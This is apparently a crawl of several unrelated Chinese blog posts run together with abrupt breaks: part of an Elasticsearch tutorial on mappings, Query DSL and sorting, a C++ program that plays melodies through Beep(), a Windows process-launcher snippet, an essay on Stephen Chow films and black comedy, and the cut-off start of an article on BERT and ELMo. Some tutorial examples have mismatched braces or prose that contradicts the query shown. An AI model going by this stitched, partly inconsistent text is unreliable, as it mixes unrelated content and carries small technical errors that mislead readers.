        "end_offset" : 8,
        "type" : "<ALPHANUM>",
        "position" : 0
    }, {
        "token" : "to",
        "start_offset" : 9,
        "end_offset" : 11,
        "type" : "<ALPHANUM>",
        "position" : 1
    }, {
        "token" : "get",
        "start_offset" : 12,
        "end_offset" : 15,
        "type" : "<ALPHANUM>",
        "position" : 2
    } ]
}

token是一个实际被存储在索引中的词。position指明词在原文本中是第几个出现的。start_offset和end_offset表示词在原文本中占据的位置。
analyze API 对于理解Elasticsearch索引的内在细节是个非常有用的工具。
指定分析器
当Elasticsearch在你的文档中探测到一个新的字符串字段，它将自动设置它为全文string字段并用standard分析器分析。
你不可能总是想要这样做。也许你想使用一个更适合这个数据的语言分析器。或者，你只想把字符串字段当作一个普通的字段——不做任何分析，只存储确切值，就像字符串类型的用户ID或者内部状态字段或者标签。
为了达到这种效果，我们必须通过映射(mapping)人工设置这些字段。
6.5 映射
为了能够正确的区分精确查询和全文本搜索，Elasticsearch需要知道每个字段里面都包含了什么类型。这些类型和字段的信息存储（包含）在映射（mapping）中。
索引中每个文档都有一个类型(type)。每个类型拥有自己的映射(mapping)或者模式定义(schema definition)。一个映射定义了字段类型，每个字段的数据类型，以及字段被Elasticsearch处理的方式。映射还用于设置关联到类型上的元数据。
核心简单字段类型
Elasticsearch支持以下简单字段类型：
|类型            |  表示的数据类型                    |
|—————-|————————————|
|String          |  string                          |
|Whole number    |  byte, short, integer, long|
|Floating point  |  float, double                 |
|Boolean         |  boolean                         |
|Date            |  date                            |
当索引一个包含新字段的文档——一个之前没有的字段——Elasticsearch将使用动态映射猜测字段类型，这类型来自于JSON的基本数据类型，使用以下规则：
|JSON type                          |          Field type    |
|———————————–|————————|
|Boolean: true or false         |          "boolean"   |
|Whole number: 123                |          "long"      |
|Floating point: 123.45           |          "double"    |
|String, valid date: "2014-09-15" |          "date"      |
|String: "foo bar"                |          "string"    |
查看映射
我们可以使用_mapping后缀来查看Elasticsearch中的映射。在本章开始我们已经找到索引website_weichao类型blog中的映射： 
> 
    GET /website_weichao/_mapping/blog
这展示给了我们字段的映射（叫做属性(properties)），这些映射是Elasticsearch在创建索引时动态生成的：
{
  "website_weichao" : {
    "mappings" : {
    "blog" : {
        "properties" : {
        "date" : {
            "type" : "date",
            "format" : "yyyy/MM/dd HH:mm:ss||yyyy/MM/dd||epoch_millis"
        },
        "doc" : {
            "properties" : {
            "tags" : {
                "type" : "string"
            },
            "views" : {
                "type" : "long"
            }
            }
        },
        "script" : {
            "type" : "string"
        },
        "tags" : {
            "type" : "string"
        },
        "text" : {
            "type" : "string"
        },
        "title" : {
            "type" : "string"
        },
        "views" : {
            "type" : "long"
        }
        }
    }
    }
    }
}


小提示
错误的映射，例如把`age`字段映射为`string`类型而不是`integer`类型，会造成查询结果混乱。
要检查映射类型，而不是假设它是正确的！


自定义字段映射
虽然大多数情况下基本数据类型已经能够满足，但你也会经常需要自定义一些特殊类型（fields），特别是字符串字段类型。
自定义类型可以使你完成一下几点：

区分全文（full text）字符串字段和准确字符串字段（译者注：就是分词与不分词，全文的一般要分词，准确的就不需要分词，比如『中国』这个词。全文会分成『中』和『国』，但作为一个国家标识的时候我们是不需要分词的，所以它就应该是一个准确的字符串字段）。
使用特定语言的分析器（译者注：例如中文、英文、阿拉伯语，不同文字的断字、断词方式的差异）
优化部分匹配字段
指定自定义日期格式（译者注：这个比较好理解,例如英文的 Feb,12,2016 和 中文的 2016年2月12日）
以及更多

映射中最重要的字段参数是type。除了string类型的字段，你可能很少需要映射其他的type：
{
    "number_of_clicks": {
        "type": "integer"
    }
}

string类型的字段，默认的，考虑到包含全文本，它们的值在索引前要经过分析器分析，并且在全文搜索此字段前要把查询语句做分析处理。
对于string字段，两个最重要的映射参数是index和analyer。
index
index参数控制字符串以何种方式被索引。它包含以下三个值当中的一个：
|值            |解释                                  |
|————–|————————————–|
|analyzed    |首先分析这个字符串，然后索引。换言之，以全文形式索引此字段。
|not_analyzed|索引这个字段，使之可以被搜索，但是索引内容和指定值一样。不分析此字段。
|no          |不索引这个字段。这个字段不能为搜索到。|
string类型字段默认值是analyzed。如果我们想映射字段为确切值，我们需要设置它为not_analyzed：
{
    "tag": {
        "type":     "string",
        "index":    "not_analyzed"
    }
}


其他简单类型（long、double、date等等）也接受index参数，但相应的值只能是no和not_analyzed，它们的值不能被分析。

分析
对于analyzed类型的字符串字段，使用analyzer参数来指定哪一种分析器将在搜索和索引的时候使用。默认的，Elasticsearch使用standard分析器，但是你可以通过指定一个内建的分析器来更改它，例如whitespace、simple或english。
{
    "tweet": {
        "type":     "string",
        "analyzer": "english"
    }
}

更新映射
你可以在第一次创建索引的时候指定映射的类型。此外，你也可以晚些时候为新类型添加映射（或者为已有的类型更新映射）。

重要
你可以向已有映射中**增加**字段，但你不能**修改**它。如果一个字段在映射中已经存在，这可能意味着那个字段的数据已经被索引。如果你改变了字段映射，那已经被索引的数据将错误并且不能被正确的搜索到。


我们可以更新一个映射来增加一个新字段，但是不能把已有字段的类型那个从analyzed改到not_analyzed。
为了演示两个指定的映射方法，让我们首先删除索引gb：(我直接新建了索引’newinfo_weichao’)

DELETE /gb

然后创建一个新索引，指定tweet字段的分析器为english：
PUT /newinfo_weichao <1>
{
  "mappings": {
    "tweet" : {
      "properties" : {
        "tweet" : {
          "type" :    "string",
          "analyzer": "english"
        },
        "date" : {
          "type" :   "date"
        },
        "name" : {
          "type" :   "string"
        },
        "user_id" : {
      "type" :   "long"
        }
      }
    }
  }
}

<1> 这将创建包含mappings的索引，映射在请求体中指定。
接着，在tweet的映射中增加一个新的not_analyzed类型的文本字段，叫做tag，使用_mapping后缀:
PUT /gb/_mapping/tweet
{   
    "properties" : {
    "tag" : {
      "type" :    "string",
      "index":    "not_analyzed"
    }
 }
}

注意到我们不再需要列出所有的已经存在的字段，因为我们没法修改他们。我们的新字段已经被合并至存在的那个映射中。
测试映射
你可以通过名字使用analyze API测试字符串字段的映射。对比这两个请求的输出：

GET /newinfo_weichao1/_analyze?field=tweet&text=Black-cats <1>

GET /newinfo_weichao1/_analyze?field=tag&text=Black-cats <2>

<1> <2> 我们想要分析的文本被放在请求体中。
<1>执行结果

{
  "tokens" : [ {
    "token" : "black",
    "start_offset" : 0,
    "end_offset" : 5,
    "type" : "<ALPHANUM>",
    "position" : 0
  }, {
    "token" : "cat",
    "start_offset" : 6,
    "end_offset" : 10,
    "type" : "<ALPHANUM>",
    "position" : 1
  } ]
}


<2>执行结果

{ 
        “tokens” : [ { 
          “token” : “Black-cats”, 
          “start_offset” : 0, 
          “end_offset” : 10, 
          “type” : “word”, 
          “position” : 0 
        } ] 
      }

tweet字段产生两个词，"black"和"cat",tag字段产生单独的一个词"Black-cats"。换言之，我们的映射工作正常。
6.6 复合核心字段类型
除了之前提到的简单的标量类型，JSON还有null值，数组和对象，所有这些Elasticsearch都支持：
多值字段
我们想让tag字段包含多个字段，这非常有可能发生。我们可以索引一个标签数组来代替单一字符串：
{ "tag": [ "search", "nosql" ]}
对于数组不需要特殊的映射。任何一个字段可以包含零个、一个或多个值，同样对于全文字段将被分析并产生多个词。
这意味着数组中所有值必须为同一类型。如果你创建一个新字段，这个字段索引了一个数组，Elasticsearch将使用第一个值的类型来确定这个新字段的类型。

当你从Elasticsearch中取回一个文档，任何一个数组的顺序和你索引它们的顺序一致。你取回的_source字段的顺序同样与索引它们的顺序相同。
数组是作为多值字段被索引的，它们没有顺序。在搜索阶段你不能指定“第一个值”或者“最后一个值”。倒不如把数组当作一个值集合(bag of values)

空字段
当然数组可以是空的。这等价于有零个值。事实上，Lucene没法存放null值，所以一个null值的字段被认为是空字段。
这四个字段将被识别为空字段而不被索引：
"empty_string":             "",
"null_value":               null,
"empty_array":              [],
"array_with_null_value":    [ null ]
多层对象
我们需要讨论的最后一个自然JSON数据类型是对象(object)——在其它语言中叫做hash、hashmap、dictionary 或者 associative array.
内部对象(inner objects)经常用于在另一个对象中嵌入一个实体或对象。例如，做为在tweet文档中user_name和user_id的替代，我们可以这样写：
{
    "tweet":            "Elasticsearch is very flexible",
    "user": {
        "id":           "@johnsmith",
        "gender":       "male",
        "age":          26,
        "name": {
            "full":     "John Smith",
            "first":    "John",
            "last":     "Smith"
        }
    }
}
内部对象的映射
Elasticsearch 会动态的检测新对象的字段，并且映射它们为 object 类型，将每个字段加到 properties 字段下
{
  "gb": {
    "tweet": { <1>
      "properties": {
        "tweet":            { "type": "string" },
        "user": { <2>
          "type":             "object",
          "properties": {
            "id":           { "type": "string" },
            "gender":       { "type": "string" },
            "age":          { "type": "long"   },
            "name":   { <3>
              "type":         "object",
              "properties": {
                "full":     { "type": "string" },
                "first":    { "type": "string" },
                "last":     { "type": "string" }
              }
            }
          }
        }
      }
    }
  }
}
<1> 根对象. 
<2><3> 内部对象.
对user和name字段的映射与tweet类型自己很相似。事实上，type映射只是object映射的一种特殊类型，我们将 object 称为根对象。它与其他对象一模一样，除非它有一些特殊的顶层字段，比如 _source, _all 等等。
内部对象是怎样被索引的
Lucene 并不了解内部对象。 一个 Lucene 文件包含一个键-值对应的扁平表单。 为了让 Elasticsearch 可以有效的索引内部对象，将文件转换为以下格式：
{
    "tweet":            [elasticsearch, flexible, very],
    "user.id":          [@johnsmith],
    "user.gender":      [male],
    "user.age":         [26],
    "user.name.full":   [john, smith],
    "user.name.first":  [john],
    "user.name.last":   [smith]
}
内部栏位可被归类至name，例如"first"。 为了区别两个拥有相同名字的栏位，我们可以使用完整路径，例如"user.name.first" 或甚至类型名称加上路径："tweet.user.name.first"。

注意： 在以上扁平化文件中，并没有栏位叫作user也没有栏位叫作user.name。 Lucene 只索引阶层或简单的值，而不会索引复杂的资料结构。

对象-数组
内部对象数组
最后，一个包含内部对象的数组如何索引。 我们有个数组如下所示：
{
    "followers": [
        { "age": 35, "name": "Mary White"},
        { "age": 26, "name": "Alex Jones"},
        { "age": 19, "name": "Lisa Smith"}
    ]
}
此文件会如我们以上所说的被扁平化，但其结果会像如此：
{
    "followers.age":    [19, 26, 35],
    "followers.name":   [alex, jones, lisa, smith, mary, white]
}
{age: 35}与{name: Mary White}之间的关联会消失，因每个多值的栏位会变成一个值集合，而非有序的阵列。 

第七章 请求体查询
请求体查询(request body search)API是对简单查询语句(lite)（一种有效的命令行adhoc查询）的有效补充。因为大多数的参数以JSON格式所容纳而非查询字符串，因此请求体查询是相当重要。
7.1 空查询
空查询将会返回索引中所有的文档。
GET /_search
{} <1>

<1> 这是一个空查询数据。
同字符串查询一样，你可以查询一个，多个或_all索引(indices)或类型(types)：

GET /index_2014*/type1,type2/_search 
      {}

使用from及size参数进行分页：
GET /_search
{
  "from": 30,
  "size": 10
}

7.2 结构化查询Query DSL(Query Domain Specific Language)
结构化查询是一种灵活的，多表现形式的查询语言。 
Elasticsearch在一个简单的JSON接口中用结构化查询来展现Lucene绝大多数能力。它使得查询更加灵活，精准，易于阅读并且易于debug。
使用结构化查询，需要传递query参数：
GET /_search
{
    "query": YOUR_QUERY_HERE
}

空查询 - {} - 在功能上等同于使用match_all查询子句，正如其名字一样，匹配所有的文档：
GET /_search
{
    "query": {
        "match_all": {}
    }
}

查询子句
一个查询子句一般使用这种结构：
{
    QUERY_NAME: {
        ARGUMENT: VALUE,
        ARGUMENT: VALUE,...
    }
}

或指向一个指定的字段：
{
    QUERY_NAME: {
        FIELD_NAME: {
            ARGUMENT: VALUE,
            ARGUMENT: VALUE,...
        }
    }
}

例如，可以使用match查询子句用来找寻在tweet字段中找寻包含elasticsearch的成员：
{
    "match": {
        "tweet": "elasticsearch"
    }
}

完整的查询请求是这样：
GET /_search
{
    "query": {
        "match": {
            "tweet": "elasticsearch"
        }
    }
}

合并多子句
查询子句就像是搭积木一样，可以合并简单的子句为一个复杂的查询语句，比如：

叶子子句(leaf clauses)(比如match子句)用以在将查询字符串与一个字段(或多字段)进行比较
复合子句(compound)用以合并其他的子句。例如，bool子句允许你合并其他的合法子句，must，must_not或者should，如果可能的话：
{
"bool": {
    "must":     { "match": { "tweet": "elasticsearch" }},
    "must_not": { "match": { "name":  "mary" }},
    "should":   { "match": { "tweet": "full text" }}
    }
}


复合子句能合并 任意其他查询子句，包括其他的复合子句。 
这就意味着复合子句可以相互嵌套，从而实现非常复杂的逻辑。
以下实例查询在inbox中或未标记spam的邮件中找出包含"business opportunity"的星标(starred)邮件：
{
    "bool": {
        "must": { "match":      { "email": "business opportunity" }},
        "should": [
             { "match":         { "starred": true }},
             { "bool": {
                   "must":      { "folder": "inbox" }},
                   "must_not":  { "spam": true }}
             }}
        ],
        "minimum_should_match": 1
    }
}

复合子句可以合并多种子句为一个单一的查询，无论是叶子子句还是其他的复合子句。
7.3 查询与过滤
前面讲到的是关于结构化查询语句，事实上有两种结构化语句可以使用： 
结构化查询（Query DSL）和结构化过滤（Filter DSL）。 
查询与过滤语句非常相似，但是它们由于使用目的不同而稍有差异。
一条过滤语句会询问每个文档的字段值是否包含着特定值：

created 的日期范围是否在 2013 到 2014 ?
status 字段中是否包含单词 “published” ?
lat_lon 字段中的地理位置与目标点相距是否不超过10km ?

一条查询语句与过滤语句相似，但问法不同：
查询语句会询问每个文档的字段值与特定值的匹配程度如何？
查询语句的典型用法是为了找到文档：

查找与 full text search 这个词语最佳匹配的文档
查找包含单词 run ，但是也包含runs, running, jog 或 sprint的文档
同时包含着 quick, brown 和 fox  — 单词间离得越近，该文档的相关性越高
标识着 lucene,  search 或 java  — 标识词越多，该文档的相关性越高

一条查询语句会计算每个文档与查询语句的相关性，会给出一个相关性评分 _score，并且按照相关性对匹配到的文档进行排序。 
这种评分方式非常适用于一个没有完全配置结果的全文本搜索。
性能差异
使用过滤语句得到的结果集 –  一个简单的文档列表，快速匹配运算并存入内存是十分方便的，每个文档仅需要1个字节。这些缓存的过滤结果集与后续请求的结合使用是非常高效的。
查询语句不仅要查找相匹配的文档，还需要计算每个文档的相关性，所以一般来说查询语句要比过滤语句更耗时，并且查询结果也不可缓存。
倒排索引，使得一个只匹配少量文档的简单查询语句在百万级文档中的查询效率会与一条经过缓存的过滤语句旗鼓相当，甚至略占上风。 
但是一般情况下，一条经过缓存的过滤查询要远胜一条查询语句的执行效率。
过滤语句的目的就是缩小匹配的文档结果集，所以需要仔细检查过滤条件。
什么情况下使用
原则上来说，使用查询语句做全文本搜索或其他需要进行相关性评分的时候，剩下的全部用过滤语句
7.4 最重要的查询
快速的介绍一下这些最常用到的查询过滤语句。
match_all 查询
使用match_all 可以查询到所有文档，是没有查询条件下的默认语句。
{
    "match_all": {}
}

此查询常用于合并过滤条件。 
比如说你需要检索所有的邮箱,所有的文档相关性都是相同的，所以得到的_score为1
match 查询
match查询是一个标准查询，不管你需要全文本查询还是精确查询基本上都要用到它。
如果你使用 match 查询一个全文本字段，它会在真正查询之前用分析器先分析match一下查询字符：
{
    "match": {
        "tweet": "About Search"
    }
}

如果用match指定了一个确切值，在遇到数字，日期，布尔值或者not_analyzed 的字符串时，它将为你搜索你给定的值：
{ "match": { "age":    26           }}
{ "match": { "date":   "2014-09-01" }}
{ "match": { "public": true         }}
{ "match": { "tag":    "full_text"  }}


提示： 
      做精确匹配搜索时，你最好用过滤语句，因为过滤语句可以缓存数据。

与《简单搜索》中介绍的字符查询不同，match查询不可以用类似”+usid:2 +tweet:search”这样的语句。它只能就指定某个确切字段某个确切的值进行搜索，而你要做的就是为它指定正确的字段名以避免语法错误。
multi_match 查询
multi_match查询允许你做match查询的基础上同时搜索多个字段：
{
    "multi_match": {
        "query":    "full text search",
        "fields":   [ "title", "body" ]
    }
}

range 过滤
range过滤允许我们按照指定范围查找一批数据：
{
    "range": {
        "age": {
            "gte":  20,
            "lt":   30
        }
    }
}

范围操作符包含：
gt ::     大于
gte::     大于等于
lt ::     小于
lte::     小于等于
term 过滤
term主要用于精确匹配一些值，比如数字，日期，布尔值或 not_analyzed的字符串(未经分析的文本数据类型)：
{ "term": { "age":    26           }}
{ "term": { "date":   "2014-09-01" }}
{ "term": { "public": true         }}
{ "term": { "tag":    "full_text"  }}

terms 过滤
terms 跟 term 有点类似，但 terms 允许指定多个匹配条件。 
如果某个字段指定了多个值，那么文档需要一起去做匹配：
{
    "terms": {
        "tag": [ "search", "full_text", "nosql" ]
        }
}

exists 和 missing 过滤
exists 和 missing 过滤可以用于查找文档中是否包含指定字段或没有某个字段，类似于SQL语句中的IS_NULL条件
{
    "exists":   {
        "field":    "title" 
    }
}

这两个过滤只是针对已经查出一批数据来，但是想区分出某个字段是否存在的时候使用。
7.5 查询与过滤条件的合并
实际生产中，没有哪个请求查询是简单的，往往需要将多请求查询和单个请求查询结合起来。
bool 过滤
bool 过滤可以用来合并多个过滤条件查询结果的布尔逻辑，它包含一下操作符：
must      :: 多个查询条件的完全匹配,相当于 and。
must_not  :: 多个查询条件的相反匹配，相当于 not。
should    :: 至少有一个查询条件匹配, 相当于 or。
filter    :: 依据条件筛选出满足或不满足条件的文档。
这些参数可以分别继承一个过滤条件或者一个过滤条件的数组：
{
    "bool": {
        "must":     { "match": { "title": "how to make millions" }},
        "must_not": { "match": { "tag":   "spam" }},
        "should": [
            { "match": { "tag": "starred" }},
            { "range": { "date": { "gte": "2014-01-01" }}}
        ]
    }
}

以上查询将会找到 title 字段中包含 “how to make millions”，并且 “tag” 字段没有被标为 spam。 
如果有标识为 “starred” 或者发布日期为2014年之前，那么这些匹配的文档将比同类文档等级高。

提示： 
  如果bool 查询下没有must子句，那至少应该有一个should子句。但是 
  如果有must子句，那么没有should子句也可以进行查询。

bool 查询
bool 查询与 bool 过滤相似，用于合并多个查询子句。不同的是，bool 过滤可以直接给出是否匹配成功， 
而bool 查询要计算每一个查询子句的 _score （相关性分值）。
must::        查询指定文档一定要被包含。
must_not::    查询指定文档一定不要被包含。
should::      查询指定文档，有则可以为文档相关性加分。
7.6 验证查询
查询语句可以变得非常复杂，特别是与不同的分析器和字段映射相结合后，就会有些难度。
validate API 可以验证一条查询语句是否合法。
GET /gb/tweet/_validate/query
{
   "query": {
      "tweet" : {
         "match" : "really powerful"
      }
   }
}

从下面的返回信息得知，以上请求的这条语句是非法的：
{
  "valid" :         false,
  "_shards" : {
    "total" :       1,
    "successful" :  1,
    "failed" :      0
  }
}

理解错误信息
想知道语句非法的具体错误信息，需要加上 explain 参数：
GET /gb/tweet/_validate/query?explain <1>
{
   "query": {
      "tweet" : {
         "match" : "really powerful"
      }
   }
}

<1>  explain 参数可以提供语句错误的更多详情。
很显然，我们把 query 语句的 match 与字段名位置弄反了：
{
  "valid" :     false,
  "_shards" :   { ... },
  "explanations" : [ {
    "index" :   "gb",
    "valid" :   false,
    "error" :   "org.elasticsearch.index.query.QueryParsingException:
             [gb] No query registered for [tweet]"
  } ]
}

“`
理解查询语句
如果是合法语句的话，使用 explain 参数可以返回一个带有查询语句的可阅读描述，可以帮助了解查询语句在ES中是如何执行的：
GET /_validate/query?explain
{
   "query": {
      "match" : {
         "tweet" : "really powerful"
      }
   }
}

explanation 会为每一个索引返回一段描述，因为每个索引会有不同的映射关系和分析器：
{
  "valid" :         true,
  "_shards" :       { ... },
  "explanations" : [ {
    "index" :       "us",
    "valid" :       true,
    "explanation" : "tweet:really tweet:powerful"
  }, {
    "index" :       "gb",
    "valid" :       true,
    "explanation" : "tweet:really tweet:power"
  } ]
}

从返回的 explanation 你会看到 match 是如何为查询字符串 "really powerful" 进行查询的， 
首先，它被拆分成两个独立的词分别在 tweet 字段中进行查询。
而且，在索引us中这两个词为"really"和"powerful"，在索引gb中被拆分成"really" 和 "power"。 
这是因为我们在索引gb中使用了english分析器。
7.7 总结
详细介绍了如何在项目中使用常见的查询语句。
想要完全掌握搜索和结构化查询，还需要在工作中花费大量的时间来理解ES的工作方式。

第八章 相关性排序
默认情况下，结果集会按照相关性进行排序 – 相关性越高，排名越靠前。 
这一章我们会讲述相关性是什么以及它是如何计算的。
8.1 排序方式
为了使结果可以按照相关性进行排序，我们需要一个相关性的值。在ElasticSearch的查询结果中，相关性分值会用_score字段来给出一个浮点型的数值，所以默认情况下，结果集以_score进行倒序排列。
有时，即便如此，你还是没有一个有意义的相关性分值。比如，以下语句返回所有tweets中 user_id 是否 
包含值 1：
GET /_search
{
    "query" : {
        "filtered" : {
            "filter" : {
                "term" : {
                    "user_id" : 1
                }
            }
        }
    }
}

过滤语句与 _score 没有关系，但是有隐含的查询条件 match_all 为所有的文档的 _score 设值为 1。也就相当于所有的文档相关性是相同的。
字段值排序
下面例子中，对结果集按照时间排序，将最新的文档排列靠前。使用 sort 参数进行排序：
GET /_search
{
    "query" : {
        "filtered" : {
            "filter" : { "term" : { "user_id" : 1 }}
        }
    },
    "sort": { "date": { "order": "desc" }}
}

你会发现这里有两个不同点：
"hits" : {
    "total" :           6,
    "max_score" :       null,      <1>
    "hits" : [ {
        "_index" :      "us",
        "_type" :       "tweet",
        "_id" :         "14",
       "_score" :      null,        <1>
       "_source" :     {
             "date":    "2014-09-24",
 






话不多说，上代码：
 
#include <windows.h>
#include <iostream>
#include <map>
using namespace std;

const int DO = 261;
const int RE = 293;
const int MI = 329;
const int FA = 349;
const int SO = 392;
const int LA = 440;
const int TI = 493;

const int DO_ = 130;
const int RE_ = 147;
const int MI_ = 165;
const int FA_ = 174;
const int SO_ = 186;
const int LA_ = 220;
const int TI_ = 247;

int frequency(char note){
    static map<const char,int> table;
    
    if(table.size() == 0){
        table['1'] = DO;    
        table['2'] = RE;            
        table['3'] = MI;    
        table['4'] = FA;    
        table['5'] = SO;    
        table['6'] = LA;    
        table['7'] = TI;    
        
        table['c'] = DO_;    
        table['d'] = RE_;            
        table['e'] = MI_;    
        table['f'] = FA_;    
        table['g'] = SO_;    
        table['a'] = LA_;    
        table['b'] = TI_;    
    }
        
    return table.find(note) -> second;
}

class music{
    private:
        string notes;
        int tenuto;
    public:
        music(string &song , int tenuto_) { notes = song; tenuto = tenuto_; play(notes.end(),tenuto);}
        void play(string::iterator it,int duration );
};
void music::play(string::iterator it, int duration){
    char note = *it;
    
    if( it == notes.begin() )
        return;
    
    if( note == '-') 
        play( it - 1, duration + tenuto);
    else {
        if( isalnum(note) ) {
            play( it - 1, 0);
            
            Beep(frequency(note), tenuto + duration);
        } else
            play( it - 1, duration);
    }
    
}

 string bee = "\
 5 3 3 - | 4 2 2 - | 1 2 3 4 | 5 5 5 - | \
 5 3 3 - | 4 2 2 - | 1 3 5 5 | 3 3 3 - | \
 2 2 2 2 | 2 3 4 - | 3 3 3 3 | 3 4 5 - | \
 5 3 3 - | 4 2 2 - | 1 3 5 5 | 1 3 1 - |  \
 ";
 
 string happynewyear = "\
						  1 1 1 - g - | 3 3 3 - 1 - | 1 3 5 - 5 - | \
						  4 3 2 - - - | 2 3 4 - 4 - | 3 2 3 - 1 - | \
						  1 3 2 - g - | b 2 1 - - - | \
						  ";
 
 int main()
 {    
	 music m(bee, 300);
	 
	 music m2(happynewyear, 200);
	 
	 return 0;
 }
 
 


 






// Test_of_callexe.cpp : Defines the entry point for the console application.
//
#include<stdafx.h>
#include <windows.h>
#include <stdio.h>
#include <conio.h>


int main(int argc, char * argv[]) { 
    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    CreateProcess(NULL, "NeNe_lesson2.exe", NULL, NULL, TRUE , 0, NULL, 0, &si, &pi);
    CloseHandle(pi.hThread);

    WaitForSingleObject(pi.hProcess, -1);

   int nExitCode = 0;
    ::GetExitCodeProcess(pi.hProcess, (LPDWORD)&nExitCode);
   CloseHandle(pi.hProcess);

   // printf("press any key to continue...\n");

    //getchar();
    return nExitCode; 
}

 










0.绪论
本文打算写个三部曲。想想还是算了，毕竟工作这么忙。
王小波说过，一个人只拥有此生此世是不够的，他还应该拥有诗意的世界。 
现在的年轻人喜爱电影，而这个第七门艺术作为一种生活方式，渗透到了我们每个人的日常。
作为一个IT界人士，我们能够更加娴熟的订购座位，描述CG（computer generate）的原理，像骇客帝国的neo一样看透这一切不过是数字放映机上的二进制流。好在，我们都喜欢电影，即使是网上下载的，它其中依然有一个更大的世界。

1.优秀的电影，让我们的生命在不同纬度上得以延伸。
青年时期，每个人都对生活有一种戏剧化的要求，就好像我们爱看武侠小说，公交车开的摇摇晃晃的，我偏偏什么都不扶，看到一车人都东倒西歪的，他们那里知道这是一个中二武侠迷的戏剧代入，他们那里知道我是修习了少林《易经经》内功的武学奇才：“他强由他强，清风拂山岗，他横由他横，明月照大江”，中二的事情当然不止这样，我走过的所有自动门都是我默默用原力开启的，我会胡说？
小时候最喜欢的是周星驰，感觉他的电影都很好看，不愿意放过每一个细节，守着电视机从头看到尾，模仿他的台词动作，希望自己也一样搞笑幽默。但是其实我们很多人都知道，长大了再看星爷的电影《喜剧之王》等，会逐渐发现星爷其实是把很多喜剧当作正剧来拍的。用他自己的话来说就是：“我就是不明白，我其实即英俊又浪漫多情，但为什么观众看到我在电影里谈情说爱也会狂笑？”

一脸严肃的谈情说爱？
史蒂芬周的电影在欢乐之中总是蕴含着一定的生活智慧，和人生哲理。周星星的父亲是上海人，母亲是广东人，很典型的草根阶层长大。自然会对此阶层比较熟悉，周的电影会挑选一些很有代表性的普通人，这些人物的励志经历常常带给人光明和希望。周星驰曾说：很多时候，我会见到社会上的一些不公正不公平的事情，你有没有胆量站出来主持公道？老实说我没有这个勇气，所以我只能寄情于电影。
 

想要电影票的姑娘（张学友的出现让我再次相信爱情！）













做饭的真谛——只要用心，人人都可以成为食神。
就像古龙的小说《三少爷的剑》一样，成功人士在达到顶峰之后往往是寂寞的，也是他心理防线最虚弱的时候。食神中的星爷经历了胜与败的双重考验，我们喜欢星爷的电影，从某种程度上也是喜欢体验超越我们自身范围之外的另一种生活途径。
电影本身是一种想象的产物，而我们通过电影经历一次想象的想象，这种双重的想象将我们从狭窄的生活中暂时解放出来，这种奇异性，正是我们喜欢电影的理由所在。

2.不懂，你的黑色幽默
最近看电影，不停的快进，我总是希望可以看到一些可以颠覆好莱坞大片模式的新影像。比如最近谍影重重5，中情局女特工用屋子里面的手机把笔记本电脑关了，还搜出来伯恩的ip留在她电脑上的cmd窗口里，我本着职业精神瞥了一眼：192.168.1.1，难道就不能专业点，放个公网ip，谁又不是没做过木马。不知道这算不算是一种幽默，下面我们来回味一下电影中的黑色幽默。
记得王小波众多亦真亦谐，一本正经不知是否胡说八道的段子中，有一个说，有段时间全国人民都爱早起甩手，认为甩手运动是一种有助于身体健康的锻炼，但后来不知道谁传起来说甩手运动是一个可怕的阴谋，因为这意味着 “全国人民都甩手不干了！”全国人民遂恐慌地终止了这一运动的流行。
这一段子非常简练精准地体现了黑色幽默的特质：黑色幽默的核心是一种荒诞，而这种荒诞通常来源于人行为中吊诡的僵硬与机械感。Henri Bergson在用哲学框架理论化喜剧和幽默的时候，提出的一个核心观点是说：人变得像机器一样，是最引人发笑的。
当然小波同志还说了，我们的生活有这么多的障碍，真他妈的有意思，这种逻辑也是黑色幽默，苦中作乐，看天土色，看地蓝色，蹲在臭烘烘的茅厕里胃口大开，对苦难生活的解构本身就是一种黑色的风格。
冯小刚《甲方乙方》—-好梦一日游就是一种解构，同样也是一种幽默。




当然，著名的几部我就不一一解构了，黑色幽默它代表了人们积极的人生态度以及笑看风雨的豁达情怀另外还有富贵不能移威武不能屈的人生品质和先天下之忧而忧后天下之乐而乐沉舟侧畔千帆过病树前头万木春停车坐爱枫林晚不以物喜不以己悲的终极追求，既然生活是这样，不如，我们一起黑色一下吧。

《snatch》

《Lock, Stock and Two Smoking Barrels》

《Trainspotting》

下面是看截图猜电影活动：
1. 
 
2. 
 
3. 
 
4. 
 
5. 
 
6. 

7. 
 
8. 
 
9. 
 
10. 
 
11. 


全部猜对有奖！请在下方留言写下你的答案
下面是老王看过电影的海报墙，现在电影fm网站好像把这个功能下线了，回头有空了写一个：

参考文献： 
1.https://moment.douban.com/post/102053/ 
2.《影像的行板》 
3.https://moment.douban.com/post/131195/?douban_rec=1
p.s. 
祝大家双节快乐。

本文原创首发于微信公众号：老王和他的IT界朋友们 
原文链接 
http://mp.weixin.qq.com/s?__biz=MzIyMDQwNzc5MQ==&mid=2247483899&idx=1&sn=9a984964e7e0cbe6a796e31446d94335#rd 







最近谷歌研究人员通过新的BERT模型在11项NLP任务中夺得STOA结果，这在自然语言处理学界以及工业界都引起了不小的热议。作者通过在33亿文本的语料上训练语言模型，再分别在不同的下游任务上微调，这样的模型在不同的任务均得到了目前为止最好的结果，并且有一些结果相比此前的最佳成绩得到了幅度不小的提升。作者的这一研究其实是今年深度学习在自然语言处理中一个新热点方向的延续，故事还得从更早一点说起。BERT的“前任”们早在2015年的时候，微软研究院的何恺明和他的同事们发表了残差网络的论文，第一次通过残差的方式将卷积神经网络推进到了100层以上，并在图像识别的任务上刷新了当时的最高纪录。自那以后起，随着网络不断地加深，效果也在不断提升。然而大量的数据训练出来的大型网络虽然效果更好，但随着网络的加深以及数据集的不断扩大，完全重新训练一个模型所需要的成本也在不断地增加。因此在计算机视觉处理中，人们越来越多地采用预训练好的大型网络来提取特征，然后再进行后续任务。目前这种处理方式已经是图像处理中很常见的做法了。相比之下，自然语言处理目前通常会使用预训练的词向量来进行后续任务。但词向量是通过浅层网络进行无监督训练，虽然在词的级别上有着不错的特性，但却缺少对连续文本的内在联系和语言结构的表达能力。因此大家也希望能像图像领域那样，通过大量数据来预训练一个大型的神经网络，然后用它来对文本提取特征去做后续的任务，以期望能得到更好的效果。其实这一方向的研究一直在持续，直到今年的早些时候AllenAI提出的[ELMo](https://arxiv.org/pdf/1802.05365.pdf)由于其在后续任务上的优异表现获得了不小的关注。在CMRC2018阅读理解比赛中，追一科技的参赛方案就运用了ELMo模型的预训练方式，并做了相应的改进。因为原本的ELMo当中对英文进行了字符级别的编码，但这对中文并不适用。我们在此基础上改进为笔画级别的